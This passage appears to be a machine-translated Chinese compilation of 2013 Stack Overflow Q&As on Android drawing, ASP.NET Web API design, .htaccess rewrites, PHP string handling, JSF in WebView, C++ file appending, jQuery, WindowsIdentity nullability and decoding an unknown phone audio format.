            print("game over")
            gameover() 
```

杀死外星人的代码在哪里？

# android - Android ImageView 绘图对象

> ID：15998354
> 
> 赞同：1
> 
> 时间：2013-04-14T11:04:48.587
> 
> 标签：android, android-imageview

我有这个 Android 程序，我想在其中显示一个`Rectangle`父`ImageView`布局。组件设置在此层次结构上并遵循下面列出的布局。显示矩形的代码也如下所示：

*   线性布局 [垂直]

*   微调器
*   图像视图

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical">    
    <Spinner
        android:id="@+id/spinMap"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        tools:listitem="@android:layout/simple_spinner_item" />    
    <ImageView
        android:id="@+id/imageMap"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="@android:color/black" />
</LinearLayout> 
```

代码：

```
public class MainActivty extends Activity {

    private Display     display;
    private Spinner     spinMap;
    private ImageView   imageMap;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initailize();
    }
    private void initailize() {
        display = getWindowManager().getDefaultDisplay();
        spinMap = (Spinner) findViewById(R.id.spinMap);
        imageMap = (ImageView) findViewById(R.id.imageMap);
        imageMap.draw(drawMap());
    }
    private Canvas drawMap() {
        Canvas canvas = new Canvas(Bitmap.createBitmap(display.getWidth(), display.getHeight(), Bitmap.Config.RGB_565));
        Paint paint = new Paint();
        paint.setColor(Color.RED);
        canvas.drawRect(10.0f, 10.0f, 100.0f, 100.0f, paint);
        return canvas;
    }
} 
```

问题是当我运行应用程序时，`Rectangle`没有显示。我怎样才能显示`Rectangle`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:14:24.997

我认为这可以帮助你[Android - ImageView 中的 Canvas drawLine](https://stackoverflow.com/questions/8445161/android-canvas-drawline-inside-imageview)

您应该使用矩形创建位图，然后将其提供给 ImageView

# asp.net-mvc-4 - 如何在单个 Web 应用程序中最好地结合 Web Api 和 MVC

> ID：15998356
> 
> 赞同：21
> 
> 时间：2013-04-14T11:04:57.413
> 
> 标签：asp.net-mvc-4, asp.net-web-api

我即将创建一个简单的 Web 应用程序，我想知道是否应该使用 ASP.NET MVC 4 新功能`Web API`。

最好的方法是什么？

我做了一些研究，发现有两种选择：

`Option 1`

将 Web Api 设为我的服务层并从控制器调用它以读取/写入数据，并使用视图模型和剃刀渲染视图。

`Option 2`

将 Web Api 设为我的服务层，并使用 Javascript 从视图中直接调用它。

我不是它的忠实粉丝，`Option 2`因为我觉得我忽略了仅用于页面之间重定向的控制器。此外，我更喜欢使用 razor 而不是 Javascript。

如果我选择`Option 1`，我是否必须在控制器中创建一个 Web API 的实例？因为这感觉就像我做错了什么。

最好的选择是什么？还有其他我没有考虑过的选择吗？

如果您能提供一些可以帮助我的参考资料或书籍，我将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-14T13:10:13.807

**我的业务规则**通常有另一层（根据应用程序的大小和复杂性，可以是不同的项目/程序集）。您可以将此**业务服务称为业务服务**，或任何适用于您的情况的名称。

所以**MVC 控制器**和**API 控制器**都使用这一层；这使应用程序保持干燥。

我个人更喜欢只在我的业务层中保留复杂的操作，这意味着如果我需要从我的持久层中读取一些内容以显示在我的视图中，我会直接在 MVC 控制器上进行。这是个人喜好问题，但我更喜欢采用**CQRS**方式。

因此，您的 MVC 控制器将实例化这些业务服务（或者如果您使用 IoC，它们将被注入到您的控制器中）。对于读取操作，您可以选择直接进入持久层或使用其他读取策略。

你的 API 控制器也会发生同样的情况，它们将使用这个“通用”服务层。

您不需要在 MVC 控制器上实例化 API 控制器。如果您正在开发 SPA 或类似内容，则可以通过 AJAX 使用您的 Web Api 控制器。

没有单一的方法来构建您的应用程序，只有不同的方法，每一种方法或多或少都会带来痛苦。

如果你正在考虑在你的应用程序中引入测试（你应该:)）；那么你应该以一种易于测试它的每个部分的方式来构建它。

只是我的2美分。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-10-31T19:25:51.053

Web API 的全部意义在于成为一个无状态的 RESTful 服务。如果你做得对，就永远不会有这样的例子。我意识到这个问题很老，您可能已经亲自了解了这一点，但是对于您来说，答案并不像对常见问题的回答那样多。

请注意，当谈到 Web API 时，人们通常在谈论 ApiControllers 而不是基本的 MVC“控制器”，它们采用路由并将它们转换为视图。

因此，在您的项目中，您可能有一些“控制器”，它们执行一些基本的视图逻辑，但没有业务逻辑。不要将其与您的服务层混淆，后者是您的业务逻辑和持久性访问的包装器。

我和许多人认为 ApiControllers 不应该与您的 MVC 应用程序混合使用。请记住，MVC 不能与 Web API 很好地混合。正如菲利普 W 所说：

> Web API 和 MVC 使用的许多概念，尽管乍一看很相似，但实际上并不兼容。例如，Web API 属性是 System.Web.Http.Filters.Filter 和 MVC 属性是 System.Web.Mvc.Filter - 它们是不可互换的。

**最灵活的答案**

所以你要做的是创建一个名为 api.YourWebsite.com 的子域，并在那里构建一个新的 Web API ApiController 项目。该 Web API 项目应该做的只是通过 ApiControllers 和依赖注入实例化和公开业务逻辑。

**备选方案 1**

面向服务的架构是关于可重用性的。如果您想保持您的应用程序 DRY，那么您绝对应该使用 SOA。虽然，每种情况都不同。如果您永远不会在本网站的任何其他应用程序（桌面、安卓、平板电脑、ewPhones 等）中使用相同的业务逻辑，那么您有另一种方法。

将您的业务逻辑层创建为不同的项目，并直接从您的 Web 应用程序访问它。当您的 Javascript（Angular/Razor？）控制器进行调用时，它们可以调用您的 ViewModel 和/或 Codebehind 或类似的东西，它们可以实例化业务逻辑并直接访问它。如果一切都在那里并且不会被重用，则不需要服务。

**备选方案 2**

继续，将您的 Web API ApiControllers 放在同一个项目中。但是，请确保将它们与 MVC“控制器”分开到不同的文件夹中。尽管如此，当您的 Javascript 控制器进行调用时，它们仍将对您的网站进行路由调用以进行无状态返回。不要将无状态 ApiController 与您的 ViewModel 和其他 MVC 代码混合使用。

这样做的缺点是缺少 SOC。现在您已经混合了服务层和 UI 层，并且您的 UI 层被迫访问您的业务逻辑层 (DLL)。如果备选方案 1 做到了，那有什么问题？

好吧，问题在于备选方案 1 是一个没有增长空间的小型应用程序。其他任何东西（原始计划，或此处的备选方案 2）都应该具有不知道业务逻辑（或持久性）是否存在的 UI。他们应该在不知道后端世界的情况下做他们的小事。

# php - 如何在 mod_rewrite htaccess 中使用多个变量定位目录？

> ID：15998357
> 
> 赞同：1
> 
> 时间：2013-04-14T11:04:59.437
> 
> 标签：php, .htaccess, mod-rewrite

`.htaccess`我想为根目录和管理目录使用一个文件。

在尝试拥有干净的 URL 时，我想`admin/index.php`在管理员位于 URI 中时使用该文件。否则使用根目录`index.php`。

这就是我所拥有的，它非常适合第一个变量（例如 localhost/admin/users），但是如果我放置第二个变量（例如 localhost/admin/users/add_user）会导致 404。

请帮助或简化，我正在拔头发...

```
RewriteEngine on

# Remove trailing '/'
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.+)/$ /$1 [R,L]

RewriteRule ^admin/?$ /admin/index.php
RewriteRule ^admin/([a-zA-Z0-9-]+)/?$ /admin/index.php?controller=$1 [QSA]
RewriteRule ^admin/([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+)/?$ /admin/index.php?controller=$1&method=$2 [QSA]
RewriteRule ^admin/([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+)/?$ /admin/index.php?controller=$1&method=$2&id=$3 [L,QSA]

RewriteRule ^([a-zA-Z0-9-]+)/?$ /index.php?controller=$1 [QSA]
RewriteRule ^([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+)/?$ /index.php?controller=$1&method=$2 [QSA]
RewriteRule ^([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+)/?$ /index.php?controller=$1&method=$2&id=$3 [QSA] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T19:39:31.577

`localhost/admin/users/add_user`不起作用的原因是因为您是用于捕获**add_user**分组的正则表达式是`([a-zA-Z0-9-]+)`. 请注意，在匹配的字符集中，`_`不是其中之一。这就是为什么不应用规则的原因，因为正则表达式不匹配。您可以尝试使其更通用：

```
RewriteRule ^admin/?$ /admin/index.php
RewriteRule ^admin/([^/]+)/?$ /admin/index.php?controller=$1 [QSA]
RewriteRule ^admin/([^/]+)/([^/]+)/?$ /admin/index.php?controller=$1&method=$2 [QSA]
RewriteRule ^admin/([^/]+)/([^/]+)/([^/]+)/?$ /admin/index.php?controller=$1&method=$2&id=$3 [L,QSA]

RewriteRule ^([^/]+)/?$ /index.php?controller=$1 [QSA]
RewriteRule ^([^/]+)/([^/]+)/?$ /index.php?controller=$1&method=$2 [QSA]
RewriteRule ^([^/]+)/([^/]+)/([^/]+)/?$ /index.php?controller=$1&method=$2&id=$3 [QSA] 
```

本质上，将所有的替换`([a-zA-Z0-9-]+)`为`([^/]+)`.

# simulation - 如何计算两个补丁之间的距离？

> ID：15998359
> 
> 赞同：1
> 
> 时间：2013-04-14T11:05:03.883
> 
> 标签：simulation, distance, shortest-path, netlogo, multi-agent

我需要找到代理前面的补丁与某个补丁（目标）之间的最小距离，以便选择能够创建最佳（最短）路径的补丁。原始**距离**只需要一个参数，所以我不能按原样使用这个函数。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T15:13:32.850

原[`distance`](http://ccl.northwestern.edu/netlogo/docs/dictionary.html#distance)语只需要一个参数，是的，但它是一个“补丁或海龟原语”：它必须在特定代理的上下文中运行，通过“询问”它与另一个代理的距离，所以你可以考虑上下文它作为另一个参数运行。

如果你想知道 和 之间的距离`patch 0 0`，`patch 1 1`你可以写：

```
ask patch 0 0 [ show distance patch 1 1 ] 
```

或者，可能更有用：

```
[ distance patch 1 1 ] of patch 0 0 
```

# php - 删除空格后爆炸字符串

> ID：15998368
> 
> 赞同：0
> 
> 时间：2013-04-14T11:06:06.280
> 
> 标签：php

我正在尝试处理从网站复制的文本。我正在使用 iMacros 从表中获取内容，并且提取的数据在数据之间有很多空格。

我正在尝试 trim 和 str_replace 删除空格并且它有效，但我遇到的问题是，当我尝试分解新字符串时，看起来我正在分解原始字符串，然后再进行修剪！数组有数百个键！

我做错了什么？

样本数据：

```
"1","
                        Data1

                    ","
                                                            Data2
                    ","                                 
                                Data3
                    ","-","-1","-","-","-","-" 
```

这是我正在使用的代码：

```
$data_lines = preg_split( '/\r\n|\r|\n/', $_POST['data'] );

foreach($data_lines as $data_line) {

    $data_line = str_replace('  ', '', $data_line);
    $data_line = str_replace('"', '', $data_line);

    $data_line = explode(',', $data_line);

    echo '<pre>';
    print_r($data_line);
    echo '</pre>';

} 
```

所以目标是在数组中获取数据值和引号中的符号/数字（显然是白引号）。

提前感谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:11:46.613

在 php 中使用 Trim 函数

```
trim — Strip whitespace (or other characters) from the beginning and end of a string - php.net 
```

[http://php.net/manual/en/function.trim.php](http://php.net/manual/en/function.trim.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:54:29.153

怎么样：

```
$data = explode(',', preg_replace(
  array('/\r\n|\r|\n/', '/"\s*(\S*?)\s*"/'), 
  array(''            , '$1'              ),
  $_POST['data']
)); 
```

[工作示例](http://ideone.com/N6zczP)

# html - 如何摆脱网站上的水平滚动条

> ID：15998369
> 
> 赞同：0
> 
> 时间：2013-04-14T11:06:07.533
> 
> 标签：html, css

抱歉，这个问题以前被问过，好像我不够清楚，我知道这个滚动条的问题是由于 css 造成的，一些教程说 width: 100% 是问题的原因，但是通过消除宽度： 100% 我还是遇到了同样的问题。我将检查我正在开发的网络应用程序，希望得到一些答案

[http://www.kefet.com/content/videoview.html?pl=PLvnIwAWCv4j3xZdRkB2MwY8-l7_jz7ngy&v=alJoYgvcY9E&cat=sls_mo&plid=36](http://www.kefet.com/content/videoview.html?pl=PLvnIwAWCv4j3xZdRkB2MwY8-l7_jz7ngy&v=alJoYgvcY9E&cat=sls_mo&plid=36)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:15:52.017

我发现了问题，它是我创建的容器 css 类的 margin-left:230 方式。

如何找到这样的问题：使用 firebug 检测导致问题的 css 并进行编辑。

谢谢

# java - 如何让 JSF 复合组件在 WebView 中工作

> ID：15998375
> 
> 赞同：0
> 
> 时间：2013-04-14T11:06:26.497
> 
> 标签：java, android, jsf-2, composite-component

我有带有 Spring 和 Hibernate 的 JSF 2.1 Web 应用程序。我需要创建该 Web 应用程序的 Android 版本。我在 WebView 的帮助下做到了。一切都好。启用 JavaScript 并浏览网页历史记录。但是，JSF 复合组件不起作用。它们在常规浏览器中运行良好。

如何使用 WebView 让 JSF 复合组件在 Android 应用程序中工作？

**编辑**：我在我的应用程序的许多地方都使用复合组件，例如我有一个组件用于查看更多“带有查看更多链接的列表项”

这是组件的代码

```
<!-- INTERFACE -->
<cc:interface>
    <cc:attribute name="from" required="true"/>
    <cc:attribute name="to" required="true" shortDescription="First time limit before clicking see more link"/>
    <cc:attribute name="moreSize" required="true"  shortDescription="Limit when clicking see more link"/>
    <cc:attribute name="totalCount" required="false" shortDescription="Total counts that helps is displaying see more link or not"/>

</cc:interface>

<!-- IMPLEMENTATION -->
<cc:implementation>
    <div class="SeeMore" from="#{cc.attrs.from}" to="#{cc.attrs.to}" moresize="#{cc.attrs.moreSize}" totalcount="#{cc.attrs.totalCount}"></div>
</cc:implementation> 
```

我用它

```
<core:seeMore moreSize="10" totalcount="20" from="0" to="10"/> 
```

当我使用 android webView 查看任何具有 core:seeMore 的页面时，它根本没有列出任何内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T21:12:05.477

经过漫长的3天，我终于找到了答案。
问题是我拥有此代码的所有复合组件

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE composition PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
```

这与 android webview 冲突并且不适用于 jquery 选择器......不知道为什么！

但是当我从复合组件中删除上述代码时。android webview 中的 web 应用程序工作正常。

# c++ - 如何使用 C++ 中的两个数据字段在现有数据文件“emp.dat”中附加记录？

> ID：15998378
> 
> 赞同：0
> 
> 时间：2013-04-14T11:07:03.487
> 
> 标签：c++, file

我需要做的：我需要在一个名为“Emp.dat”的现有数据文件中附加两个数据字段，其中包含两个新的数据字段 Ename 和 Eno。因为我附加了以前的数据，所以不能删除。

我到目前为止所尝试的：

`Ofstream fout;` `fout.open("Emp.dat");`

我可以以他的方式以写入模式打开文件，但之后如果我正在向文件写入内容，则之前的数据将被删除。

```
char Ename[30]="Biman";
fout<<Ename;
int Eno=5;
fout<<Eno; 
```

我在做什么错请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:11:13.453

您必须首先阅读完整的文件并用旧数据填充结构列表。然后用新字段写出所有结构

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:26:47.820

感谢@Uberfuzzy，让它工作了

最终代码：

```
#include <fstream>
int main () 
{
int eno=12;
char ename[15]="Biman Ghosh";
fstream filestr;
filestr.open ("Emp.dat", fstream::in | fstream::out | fstream::ate);
filestr<<eno;
filestr<<ename;
filestr.close();
return 0;
} 
```

早些时候我不知道可以使用的其他模式。现在很清楚了。

# javascript - jQuery / JavaScript - 附加选择 ID

> ID：15998379
> 
> 赞同：0
> 
> 时间：2013-04-14T11:07:10.910
> 
> 标签：javascript, jquery

我有一些代码来生成一个下拉菜单和一个显示 2/4/8 的下拉菜单，根据用户选择的内容，将创建该数量的下拉菜单。

这是模板代码：

```
div.row.hidden#rowTemplate
    label.control-label(for="team") Team:
    div.controls
        select#team1(style='width: 160px;')
            include teamsDropDown 
```

这是生成下拉列表的JS：

脚本（类型='文本/javascript'）

```
$("#nTeamSelector").change(function(){
    var nTeams = $("#nTeamSelector").val(); // Get the value of the team selector that you use
    $("#rowContainer").empty() // Delete all existing dropdowns
    for (var i=0; i<nTeams; i++){
        var newRow = $("#rowTemplate").clone(); // Exact copy of the element generated by Jade
        /*
        * here you should change all the little fields that 
        * make the dropdowns different. For example:
        */
        //newRow.children(".control-label").setText("Team "+(i+1)+":");
        newRow.attr('id', 'team'+(i+1)+'Row');
        newRow.removeClass("hidden");
        $("#rowContainer").append(newRow);
    }
}); 
```

目前，`setText`当我收到错误消息时，我无法让线路正常工作`Uncaught TypeError: Object [object Object] has no method 'setText'`。除此之外，生成的每个下拉列表都有一个从 rowTemplate 代码中引入的其中`select`一个，我想将其附加到每个生成的下拉列表的团队中。`id``#team1``i`

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:09:43.857

我想你在追求[`.text( textString )`](http://api.jquery.com/text/#text2)

```
newRow.children(".control-label").text("Team "+(i+1)+":"); 
```

* * *

要更改`select`'s `id`，您还需要选择它并应用`id`. 像这样的东西：

```
newRow.find('select').attr('id', 'team' + (i + 1)); 
```

# resharper - WindowsIdentity.GetCurrent() 可以返回 null 吗？

> ID：15998381
> 
> 赞同：14
> 
> 时间：2013-04-14T11:07:29.143
> 
> 标签：resharper, windows-identity

ReSharper 警告我可能`NullReferenceException`在

```
WindowsIdentity windowsIdentity = new WindowsIdentity(WindowsIdentity.GetCurrent().Token); 
```

我查看了 MSDN 文档，但没有看到任何提及这一点。此外，这没有任何意义，因为如果您运行可执行文件，则必须登录。

这只是 ReSharper 搜索模式吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-14T12:14:10.993

使用 ILSpy ，您可以查看`GetCurrent`和调用的反编译版本。`GetCurrentInternal``GetCurrent`

**获取电流：**

```
public static WindowsIdentity GetCurrent()
{
    return WindowsIdentity.GetCurrentInternal(TokenAccessLevels.MaximumAllowed, false);
} 
```

**获取当前内部：**

```
internal static WindowsIdentity GetCurrentInternal(TokenAccessLevels desiredAccess, bool threadOnly)
{
    int errorCode = 0;
    bool flag;
    SafeTokenHandle currentToken = WindowsIdentity.GetCurrentToken(desiredAccess, threadOnly, out flag, out errorCode);
    if (currentToken != null && !currentToken.IsInvalid)
    {
        WindowsIdentity windowsIdentity = new WindowsIdentity();
        windowsIdentity.m_safeTokenHandle.Dispose();
        windowsIdentity.m_safeTokenHandle = currentToken;
        return windowsIdentity;
    }
    if (threadOnly && !flag)
    {
        return null;
    }
    throw new SecurityException(Win32Native.GetMessage(errorCode));
} 
```

由于`threadOnly`调用 from 时始终为 false `GetCurrent`，并且 the`currentToken`必须对其他 return 语句有效，因此我认为您没有获得 null 的风险`WindowsIdentity`。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-23T18:05:50.990

ReSharper*应该*处理这个问题。

在目录 <ReSharper install dir>\v7.1\Bin\ExternalAnnotations\.NETFramework\mscorlib 中，外部注释文件 Nullness.Manual.xml 定义了以下注释：

```
<!-- RSRP-328266 -->
<member name="M:System.Security.Principal.WindowsIdentity.GetCurrent">
  <attribute ctor="M:JetBrains.Annotations.NotNullAttribute.#ctor" />
</member>
<member name="M:System.Security.Principal.WindowsIdentity.GetCurrent(System.Boolean)">
  <attribute ctor="M:JetBrains.Annotations.ContractAnnotationAttribute.#ctor(System.String)">
    <argument>false=&gt;notnull</argument>
  </attribute>
</member>
<member name="M:System.Security.Principal.WindowsIdentity.GetCurrent(System.Security.Principal.TokenAccessLevels)">
  <attribute ctor="M:JetBrains.Annotations.NotNullAttribute.#ctor" />
</member> 
```

但是，我也收到有关 WindowsIdentity.GetCurrent() 上可能出现 NullReferenceException 的警告。出于某种原因，ReSharper 无法识别其自己的外部注释属性。如果这是一个已知的错误，或者是否有解决此问题的方法，请回复。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-14T11:19:43.983

这听起来像是来自 ReSharper 的虚假报告。

[MSDN 页面`GetCurrent`](http://msdn.microsoft.com/en-us/library/sfs49sw0.aspx)没有提及在`null`任何情况下返回。

正如你所指出的，必须有一个当前用户（一种或另一种），所以这应该总是返回一个有效的对象 - 如果你有权限。

它可以引发 a `SecurityException`，但这是一个不同的错误，您的代码无论如何都会失败。如果这是可能的，那么您可能需要重新排列您的代码：

```
WindowsIdentity currentIdentity = null;
try
{
    currentIdentity = WindowsIdentity.GetCurrent();
    // Carry on if there's nothing you can do
    WindowsIdentity newIdentity = new WindowsIdentity(currentIdentity.Token);
}
catch (SecurityException ex)
{
    // Do something, logging, display error etc.
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-14T11:28:26.550

根据拆机情况，`null`可退换。

看：`GetCurrentInternal(TokenAccessLevels desiredAccess, bool threadOnly)`

**免责声明：**我懒得剖析具体情况：）

# audio - 未知的音频格式 - 在哪里挖掘？

> ID：15998383
> 
> 赞同：4
> 
> 时间：2013-04-14T11:07:44.740
> 
> 标签：audio, wav, codec, amr

在我的安卓手机（飞利浦 Xenium W632）上，我有一个通过它自己的软件来录音的选项（没有任何外部程序，这个选项在服务菜单中打开）。问题是我尝试过的任何播放器都不知道生成的格式。从内容上看，文件似乎没有被打包或加密，因此对于熟悉该领域的人来说，识别格式可能不是很困难。我想这个问题可能过于具体，无法在 SO 上提出 - 但**我根本不知道这些人交流的活跃论坛。因此，我将不胜感激为此类资源提供任何提示。**对此问题的更正确标题/标签的建议也将不胜感激。

技术信息：文件的名称如“Mon_Apr_2013__10_48_56.vm”，均从标头 0x66 0xAA 开始，每秒记录约 7.9 kb。我当然可以提供示例文件。

UPD。1）我把示例文件放在这里： [10秒录音，133 kB](https://www.dropbox.com/s/48j2x02ki30jqj3/Sun_Apr_2013__18_11_58.vm)； [122 秒录音，975 kB](https://www.dropbox.com/s/8a9opxyjaolysnb/Sun_Apr_2013__18_23_11.vm)

2）假设它是一种“三星语音备忘录文件”，我首先尝试[了 QualComm PureVoice 转换器](http://www.qualcomm.com/solutions/multimedia/voice/purevoice)，然后是 PureVoice 应用程序，然后是三星 PC Studio 版本 7.2.24.9 - 都失败了。

3）尝试了 MediaInfo（感谢@Jan 的建议）-它无法识别文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T20:18:45.617

尝试了一堆工具，唯一一个听起来不像电锯的工具是当我尝试通过“sox”使用 LPC 或 LPC10 编码转换文件时。

诚然，它真的不能被称为“录音”，因为它听起来像低沉的喃喃自语。

这是我所做的：

```
mv Sun_Apr_2013__18_11_58.vm Sun_Apr_2013__18_11_58.lpc
sox Sun_Apr_2013__18_11_58.lpc Sun_Apr_2013__18_11_58.wav

mv Sun_Apr_2013__18_11_58.vm Sun_Apr_2013__18_11_58.lpc10
sox Sun_Apr_2013__18_11_58.lpc10 Sun_Apr_2013__18_11_58.wav 
```

Sox 是一种蛮力方法，但正如其他人所建议的那样，模拟电缆方法可能是您最好的选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-23T14:49:43.093

试试 FFmpeg( `ffmpeg -i file`) 或 MPlayer( `mplayer -identify`)。如果您确实需要重新录制文件，请查看是否可以使用耳机插孔进行录制。这样，质量损失是最小的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-23T22:29:45.007

这是一个很难的案例。我调查了一些可能有助于识别文件的事情。剧透：我也无法正确播放文件。

## 文件头

文件的标题是`66 A2 C2 00`十六进制的。通过那条路线，在网络上什么也找不到。

## Linux`file`工具

`file`在任何样本上运行都不会产生有意义的结果。

```
$ file *.vm 
Sun_Apr_2013__18_11_58.vm: data
Sun_Apr_2013__18_23_11.vm: data 
```

## 调查文件结构

也许最有趣的结果是通过查看文件的十六进制转储获得的。这是较小文件中随机位置的摘录：

```
0001-ea10:  12 02 14 00-70 00 00 00-43 45 15 75-e4 51 00 04  ....p... CE.u.Q..
0001-ea20:  00 00 cc 00-0b 0b 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ea30:  3f 00 3f 00-10 27 00 00-00 00 00 00-00 00 00 00  ?.?..'.. ........
0001-ea40:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ea50:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ea60:  00 00 00 00-00 00 07 20-68 5f 6b b7-7c 84 07 00  ........ h_k.|...
0001-ea70:  0f cf 00 74-14 a1 22 44-4c 9f a7 34-80 bc ce f0  ...t.."D L..4....
0001-ea80:  21 07 ae 87-4e 6f 00 00-16 7a eb cd-c5 47 42 26  !...No.. .z...GB&
0001-ea90:  73 08 04 de-60 85 8d de-15 a4 85 10-c0 fe 1a 8f  s...`... ........
0001-eaa0:  35 32 f8 c6-bb 5f 0a 00-34 f0 e9 a9-35 a8 9f f8  52..._.. 4...5...
0001-eab0:  44 81 5c 24-3f 11 97 52-cb 1a 64 86-21 14 5d d9  D.\$?..R ..d.!.].
0001-eac0:  93 b1 1a 32-ad 49 07 00-66 aa c2 00-84 3a 91 00  ...2.I.. f....:..
0001-ead0:  2b 05 12 02-14 00 70 00-00 00 43 45-15 75 e4 51  +.....p. ..CE.u.Q
0001-eae0:  00 08 00 00-cc 00 0b 0b-00 00 00 00-00 00 00 00  ........ ........
0001-eaf0:  00 00 3f 00-3f 00 10 27-00 00 00 00-00 00 00 00  ..?.?..' ........
0001-eb00:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-eb10:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-eb20:  00 00 00 00-00 00 00 00-07 20 55 04-7a 33 8c 28  ........ ..U.z3.(
0001-eb30:  11 c0 3c 0f-00 df 20 75-5e 05 73 61-8e 67 07 4c  ..<....u ^.sa.g.L
0001-eb40:  b1 82 41 52-f5 54 51 0a-00 00 aa 20-2f 6c 9f 04  ..AR.TQ. ..../l..
0001-eb50:  f7 59 14 11-15 c5 08 2d-d9 f4 aa 64-19 65 3c 9d  .Y.....- ...d.e<.
0001-eb60:  a2 80 32 38-16 0c a2 2e-01 00 34 f0-e9 a9 35 a8  ..28.... ..4...5.
0001-eb70:  9f f8 44 81-5c 24 3f 11-97 52 cb 1a-64 86 21 14  ..D.\$?. .R..d.!.
0001-eb80:  5d d9 93 b1-1a 32 ad 49-07 00 66 aa-c2 00 89 3a  ]....2.I ..f....:
0001-eb90:  91 00 2b 05-12 02 14 00-70 00 00 00-43 45 15 75  ..+..... p...CE.u
0001-eba0:  e4 51 00 0c-00 00 cc 00-0b 0b 00 00-00 00 00 00  .Q...... ........
0001-ebb0:  00 00 00 00-3f 00 3f 00-10 27 00 00-00 00 00 00  ....?.?. .'......
0001-ebc0:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ebd0:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ebe0:  00 00 00 00-00 00 00 00-00 00 07 20-2d 7a 37 35  ........ ....-z75
0001-ebf0:  70 92 88 88-07 68 00 17-d0 43 0c d3-f2 c9 49 1c  p....h.. .C....I.
0001-ec00:  42 bd 57 70-7a fc 41 e0-67 cb 00 00-b4 5e 76 0c  B.Wpz.A. g....^v.
0001-ec10:  fd 23 74 31-19 bc 3b 1e-9e a8 86 29-cc 81 24 0e  .#t1..;. ...)..$.
0001-ec20:  d4 3a c2 9b-18 40 6b da-3a 2a 02 00-34 f0 e9 a9  .:...@k. :*..4...
0001-ec30:  35 a8 9f f8-44 81 5c 24-3f 11 97 52-cb 1a 64 86  5...D.\$ ?..R..d.
0001-ec40:  21 14 5d d9-93 b1 1a 32-ad 49 07 00-66 aa c2 00  !.]....2 .I..f...
0001-ec50:  8d 3a 91 00-2b 05 12 02-14 00 70 00-00 00 43 45  .:..+... ..p...CE
0001-ec60:  15 75 e4 51-00 10 00 00-cc 00 0b 0b-00 00 00 00  .u.Q.... ........
0001-ec70:  00 00 00 00-00 00 3f 00-3f 00 10 27-00 00 00 00  ......?. ?..'....
0001-ec80:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ec90:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-eca0:  00 00 00 00-00 00 00 00-00 00 00 00-07 20 71 15  ........ ......q.
0001-ecb0:  35 b5 74 80-00 80 51 3b-80 7f 3a 0f-e0 19 6e 2d  5.t...Q; ..:...n-
0001-ecc0:  0a 03 e3 80-7d 5a a8 fb-0a 0d fa 66-00 00 8e 28  ....}Z.. ...f...(
0001-ecd0:  d6 cd df 07-64 07 dd 89-3b af 08 0a-61 06 11 98  ....d... ;...a...
0001-ece0:  04 78 1a 82-7f 4d 7a 08-cf 6a e9 7c-0c 00 34 f0  .x...Mz. .j.|..4.
0001-ecf0:  e9 a9 35 a8-9f f8 44 81-5c 24 3f 11-97 52 cb 1a  ..5...D. \$?..R..
0001-ed00:  64 86 21 14-5d d9 93 b1-1a 32 ad 49-07 00 66 aa  d.!.]... .2.I..f.
0001-ed10:  c2 00 91 3a-91 00 2b 05-12 02 14 00-70 00 00 00  ...:..+. ....p...
0001-ed20:  43 45 15 75-e4 51 00 14-00 00 cc 00-0b 0b 00 00  CE.u.Q.. ........
0001-ed30:  00 00 00 00-00 00 00 00-3f 00 3f 00-10 27 00 00  ........ ?.?..'..
0001-ed40:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ed50:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 00 00  ........ ........
0001-ed60:  00 00 00 00-00 00 00 00-00 00 00 00-00 00 07 20  ........ ........
